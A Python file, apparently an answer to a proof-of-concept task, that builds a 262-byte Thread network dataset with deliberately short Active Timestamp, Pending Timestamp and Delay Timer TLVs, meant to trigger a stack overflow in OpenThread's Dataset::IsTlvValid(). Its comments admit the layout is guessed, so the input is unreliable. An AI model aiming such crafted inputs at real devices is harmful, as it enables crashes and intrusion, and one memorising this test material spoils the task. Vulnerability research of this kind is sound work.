import os
import struct
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description:
        # - The vulnerability is in Dataset::IsTlvValid() method
        # - Active/Pending Timestamp and Delay Timer TLVs aren't validated for minimum length
        # - This allows datasets with invalid TLVs to be accepted
        # - Ground-truth PoC length is 262 bytes
        
        # We need to craft a dataset that contains TLVs with invalid lengths
        # to trigger a stack buffer overflow when parsed
        
        # Common TLV structure in OpenThread/Thread protocols:
        # 1 byte Type, 1 byte Length, variable Value
        
        # We'll create a dataset with multiple invalid TLVs
        # The exact structure depends on the vulnerable code, but we can
        # create a minimal valid structure with corrupted TLVs
        
        poc = bytearray()
        
        # Dataset header (typical Thread dataset format)
        # Active Operational Dataset typically starts with a network key TLV
        # But the vulnerability is in timestamp TLVs validation
        
        # Add valid TLVs first to pass basic validation
        # Network Key TLV (Type 0x00, Length 16)
        poc.extend(b'\x00\x10')  # Type, Length
        poc.extend(b'\x00' * 16)  # Dummy key
        
        # Network Name TLV (Type 0x01)
        poc.extend(b'\x01\x04')  # Type, Length=4
        poc.extend(b'test')  # Network name
        
        # Now add the vulnerable TLVs with invalid lengths
        
        # Active Timestamp TLV (Type 0x0e in Thread)
        # Should be 8 bytes but we'll make it shorter
        poc.extend(b'\x0e\x01')  # Type=0x0e, Invalid Length=1 (should be 8)
        poc.extend(b'\x00')  # Only 1 byte instead of 8
        
        # Pending Timestamp TLV (Type 0x0f in Thread)
        poc.extend(b'\x0f\x01')  # Type=0x0f, Invalid Length=1
        poc.extend(b'\x00')
        
        # Delay Timer TLV (Type 0x10 in Thread)
        poc.extend(b'\x10\x01')  # Type=0x10, Invalid Length=1
        poc.extend(b'\x00')
        
        # Add padding to reach 262 bytes (ground-truth length)
        # This ensures we have enough data to trigger the overflow
        remaining = 262 - len(poc)
        if remaining > 0:
            poc.extend(b'A' * remaining)
        elif remaining < 0:
            # If we're over, trim the padding
            poc = poc[:262]
        
        return bytes(poc)